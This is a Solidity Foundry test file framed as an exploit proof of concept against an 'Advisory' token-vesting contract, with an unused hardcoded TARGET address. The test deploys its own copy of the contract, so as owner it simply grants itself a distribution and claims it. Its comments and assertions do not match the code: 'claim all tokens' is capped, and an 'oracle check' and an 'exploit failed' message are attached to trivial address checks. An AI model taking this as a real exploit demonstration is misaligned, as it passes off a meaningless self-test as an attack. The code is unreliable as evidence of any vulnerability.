pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MockBEP20 is IBEP20 {
    string public name = "Mock BEP20";
    string public symbol = "MBEP20";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

// Advisory contract definition
contract Advisory {
    address public token;
    uint256 public subsequentClaim;
    uint256 public claimPeriod;

    struct Distribution {
        uint256 amount;
        uint256 startTime;
        uint256 claimed;
    }

    mapping(address => Distribution) public distributions;
    address public owner;

    constructor(address _token, uint256 _subsequentClaim, uint256 _claimPeriod) {
        token = _token;
        subsequentClaim = _subsequentClaim;
        claimPeriod = _claimPeriod;
        owner = msg.sender;
    }

    function addDistributionWallet(address[] memory accounts, uint[] memory amounts, uint[] memory startTimes) external {
        require(msg.sender == owner, "Only owner");
        for (uint i = 0; i < accounts.length; i++) {
            distributions[accounts[i]] = Distribution({
                amount: amounts[i],
                startTime: startTimes[i],
                claimed: 0
            });
        }
    }

    function claim() external {
        Distribution storage dist = distributions[msg.sender];
        require(dist.amount > 0, "No distribution");
        require(block.timestamp >= dist.startTime, "Not started");

        uint256 claimable = dist.amount - dist.claimed;
        if (claimable > subsequentClaim) {
            claimable = subsequentClaim;
        }

        require(claimable > 0, "Nothing to claim");

        dist.claimed += claimable;
        IBEP20(token).transfer(msg.sender, claimable);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);
    Advisory public advisory;
    MockBEP20 public mockToken;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious token
        mockToken = new MockBEP20();

        // Deploy Advisory contract with malicious parameters
        // token = mockToken, claimPeriod = 1, subsequentClaim = 100e18
        advisory = new Advisory(address(mockToken), 100e18, 1);

        // Mint tokens to advisory contract
        deal(address(mockToken), address(advisory), 1_000_000 * 1e18);

        // Label addresses for debugging
        vm.label(address(mockToken), "MockBEP20");
        vm.label(address(advisory), "Advisory");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Add attacker as distribution wallet
        address[] memory accounts = new address[](1);
        uint[] memory amounts = new uint[](1);
        uint[] memory startTimes = new uint[](1);

        accounts[0] = attacker;
        amounts[0] = 1_000_000 * 1e18; // All tokens in contract
        startTimes[0] = block.timestamp + 1; // Start slightly in future

        // Call as owner (we are deployer, so we're already owner)
        advisory.addDistributionWallet(accounts, amounts, startTimes);

        // Step 2: Warp time to after start time
        vm.warp(block.timestamp + 2); // Warp 2 seconds to be safe

        // Step 3: Claim all tokens
        uint256 attackerBalanceBefore = mockToken.balanceOf(attacker);
        advisory.claim();
        uint256 attackerBalanceAfter = mockToken.balanceOf(attacker);

        // Verify we got tokens
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have received tokens");

        // Also verify token address is not zero (oracle check)
        assertTrue(address(advisory.token()) != address(0), "Token address should not be zero");
        assertTrue(address(mockToken) != address(0), "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
